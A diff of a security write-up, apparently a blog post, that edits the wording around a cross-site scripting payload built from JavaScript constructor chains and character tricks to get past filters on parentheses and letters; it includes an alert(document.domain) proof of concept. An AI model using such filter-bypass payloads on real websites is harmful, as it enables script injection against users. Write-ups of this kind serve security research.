@@ -163,7 +163,7 @@ The real payload I wanted was:
 ```
 ["sub"]["constructor"]["constructor"]`$${alert(document.domain)}$```
 ```
-Notice an issue in this payload? We are missing the ability to add parantheses `()`. This is where my previous mistake came into aid the ` ["sub"]["constructor"]` payload gave the ability to add parantheses as follows by running the in the dev console: 
+Notice an issue in this payload? We are missing the ability to add parantheses `()`. This is where my previous mistake came into aid, the ` ["sub"]["constructor"]` payload gave the ability to add parantheses as follows by running them in the dev console: 
 
 ```
 Programming for humans: 
@@ -178,7 +178,7 @@ Esoteric program:
 Results:
 ["function Array() { [native code] }"]
 ```
-Now we missing only the character `d`, which was easy to achieve when carefully I read the relevant sections of the supporting material:
+Now we are missing only the character `d`, which was easy to achieve while carefully reading the repo (https://github.com/denysdovhan/wtfjs#its-a-fail) (supporting material):
 
 ```
 [[][[]]+``]
